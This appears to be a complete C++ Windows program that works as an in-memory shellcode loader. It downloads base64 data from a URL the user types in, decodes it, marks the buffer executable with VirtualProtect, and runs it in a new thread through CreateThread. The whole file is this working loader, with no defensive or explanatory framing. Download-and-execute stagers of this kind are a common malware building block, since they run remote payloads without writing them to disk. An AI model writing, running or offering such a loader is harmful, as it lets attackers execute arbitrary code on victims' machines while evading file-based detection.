#include <windows.h>
#include <winhttp.h>
#include <wincrypt.h>
#include <iostream>
#include <vector>
#include <string>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "crypt32.lib")

std::string DownloadToMemory(const std::wstring& url) {
    URL_COMPONENTS urlComp = { 0 };
    wchar_t hostName[256], urlPath[1024];
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.lpszHostName = hostName; urlComp.dwHostNameLength = _countof(hostName);
    urlComp.lpszUrlPath = urlPath; urlComp.dwUrlPathLength = _countof(urlPath);

    if (!WinHttpCrackUrl(url.c_str(), 0, 0, &urlComp)) throw std::runtime_error("URL crack failed");

    HINTERNET hSession = WinHttpOpen(L"Downloader", WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);
    if (!hSession) throw std::runtime_error("Session failed");

    HINTERNET hConnect = WinHttpConnect(hSession, hostName, urlComp.nPort, 0);
    if (!hConnect) throw std::runtime_error("Connect failed");

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", urlPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
        urlComp.nScheme == INTERNET_SCHEME_HTTPS ? WINHTTP_FLAG_SECURE : 0);
    if (!hRequest) throw std::runtime_error("Request failed");

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0))
        throw std::runtime_error("Send failed");
    if (!WinHttpReceiveResponse(hRequest, NULL))
        throw std::runtime_error("Receive failed");

    std::string buffer;
    DWORD dwSize = 0;
    do {
        if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
        if (dwSize == 0) break;
        std::vector<char> temp(dwSize);
        DWORD dwDownloaded = 0;
        if (!WinHttpReadData(hRequest, temp.data(), dwSize, &dwDownloaded)) break;
        buffer.append(temp.data(), dwDownloaded);
    } while (dwSize > 0);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}

std::vector<BYTE> Base64Decode(const std::string& b64input) {
    DWORD len = 0;
    if (!CryptStringToBinaryA(b64input.c_str(), b64input.size(), CRYPT_STRING_BASE64, NULL, &len, NULL, NULL))
        throw std::runtime_error("Base64 decode size failed");
    std::vector<BYTE> buffer(len);
    if (!CryptStringToBinaryA(b64input.c_str(), b64input.size(), CRYPT_STRING_BASE64, buffer.data(), &len, NULL, NULL))
        throw std::runtime_error("Base64 decode failed");
    buffer.resize(len);
    return buffer;
}

int main() {
    std::wcout << L"Enter URL: ";
    std::wstring url;
    std::getline(std::wcin, url);

    try {
        std::cout << "Downloading..." << std::endl;
        std::string b64data = DownloadToMemory(url);
        std::cout << "Download size: " << b64data.size() << std::endl;

        std::cout << "Decoding base64..." << std::endl;
        std::vector<BYTE> decoded = Base64Decode(b64data);
        std::cout << "Decoded size: " << decoded.size() << std::endl;

        DWORD oldProtect;
        if (!VirtualProtect(decoded.data(), decoded.size(), PAGE_EXECUTE_READWRITE, &oldProtect))
            throw std::runtime_error("VirtualProtect failed");

        std::cout << "Creating thread..." << std::endl;
        // Create a thread to execute code in memory
        HANDLE hThread = CreateThread(
            NULL,                // Default security
            0,                   // Default stack size
            (LPTHREAD_START_ROUTINE)decoded.data(), // Thread start address
            NULL,                // Input parameter (if needed)
            0,                   // Flags
            NULL                 // Thread ID
        );
        if (!hThread)
            throw std::runtime_error("CreateThread failed");

        // Wait for the thread to finish
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);

        std::cout << "Thread finished." << std::endl;
    }
    catch (const std::exception& ex) {
        std::cerr << "Error: " << ex.what() << std::endl;
    }

    std::cout << "Press Enter to exit..." << std::endl;
    std::cin.get();
    return 0;
}
